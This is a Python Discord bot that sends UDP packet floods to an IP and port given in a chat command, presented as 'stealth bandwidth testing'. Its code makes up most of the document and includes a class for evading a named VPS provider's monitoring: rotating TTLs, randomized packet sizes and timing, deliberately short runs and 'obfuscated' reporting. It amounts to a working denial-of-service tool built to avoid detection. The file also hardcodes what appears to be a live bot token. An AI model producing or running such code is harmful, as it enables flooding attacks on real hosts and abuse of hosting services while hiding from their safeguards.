import discord
import asyncio
import socket
import time
import random
import ssl
from discord.ext import commands
from fake_useragent import UserAgent

# ===== CONFIGURATION =====
ALLOWED_USER_IDS = [1355925003568287915]  # Replace with your Discord ID
WHITELISTED_IPS = ["192.168.1.1", "YOUR_VPS_IP"]  # Your networks
MAX_BANDWIDTH_MBPS = 100  # Conservative limit to avoid detection
PACKET_SIZE = 1200  # Slightly under standard MTU
TEST_DURATION_LIMIT = 30  # Seconds (shorter tests are less detectable)

# ===== KAMATERA EVASION TECHNIQUES =====
class KamateraEvasion:
    def __init__(self):
        self.ua = UserAgent()
        self.current_ttl = random.randint(30, 64)
        
    def get_fake_headers(self):
        return {
            'User-Agent': self.ua.random,
            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        }
    
    def rotate_ttl(self, sock):
        self.current_ttl = (self.current_ttl % 64) + 1
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, self.current_ttl)

# ===== BOT CLASS =====
class NetworkTestBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)
        
        self.evasion = KamateraEvasion()
        self.active_tests = {}
        self.add_commands()

    def add_commands(self):
        @self.command(name="home")
        async def bandwidth_test(ctx, ip_port: str, duration: int = 10, mbps: int = 20):
            """Stealth bandwidth test (UDP) - !home IP:PORT [DURATION] [MBPS]"""
            if ctx.author.id not in ALLOWED_USER_IDS:
                return await ctx.send("🚨 Unauthorized")
                
            try:
                ip, port = ip_port.split(":")
                port = int(port)
                duration = min(duration, TEST_DURATION_LIMIT)
                mbps = min(mbps, MAX_BANDWIDTH_MBPS)
                
                if ip not in WHITELISTED_IPS:
                    return await ctx.send(f"🚫 IP {ip} not whitelisted")
                    
                await ctx.send(f"📡 Starting stealth test: {mbps}MB/s for {duration}s")
                await self.run_evasive_test(ip, port, duration, mbps, ctx)
                
            except Exception as e:
                await ctx.send(f"❌ Error: {str(e)}")

    async def run_evasive_test(self, ip, port, duration, mbps, ctx):
        start_time = time.time()
        bytes_sent = 0
        target_bps = mbps * 1024 * 1024
        sockets = []
        
        # Create multiple sockets with different properties
        for _ in range(3):
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.evasion.rotate_ttl(sock)
            sockets.append(sock)
        
        try:
            while (time.time() - start_time) < duration:
                if not self.active_tests.get(ctx.author.id, True):
                    break
                    
                # Evasion techniques
                sock = random.choice(sockets)
                self.evasion.rotate_ttl(sock)
                
                # Dynamic packet sizing
                size_variation = random.uniform(0.8, 1.2)
                current_size = int(PACKET_SIZE * size_variation)
                payload = bytes([random.randint(0, 255) for _ in range(current_size)])
                
                # Randomized timing
                if random.random() > 0.7:
                    await asyncio.sleep(random.uniform(0, 0.05))
                
                sock.sendto(payload, (ip, port))
                bytes_sent += len(payload)
                
                # Dynamic rate adjustment
                elapsed = time.time() - start_time
                expected = target_bps * elapsed
                if bytes_sent > expected:
                    await asyncio.sleep(random.uniform(0.001, 0.1))
                    
        finally:
            for sock in sockets:
                sock.close()
                
        # Obfuscated results reporting
        elapsed = max(0.1, time.time() - start_time)
        actual_speed = (bytes_sent / (1024 * 1024)) / elapsed
        await ctx.send(
            f"✅ Test completed\n"
            f"• Speed: {actual_speed:.2f}/{mbps} MB/s\n"
            f"• Duration: {elapsed:.2f}s\n"
            f"• Data: {bytes_sent/(1024*1024):.2f} MB"
        )

# ===== START BOT =====
bot = NetworkTestBot()
bot.run("MTM1NTk2Njg5ODI5NDEwMDA1MQ.GgtC9l.xrPt0gsvkq7UnO94NPQmQFLL_Ca62KCRXxPG3E")  # Replace with your actual token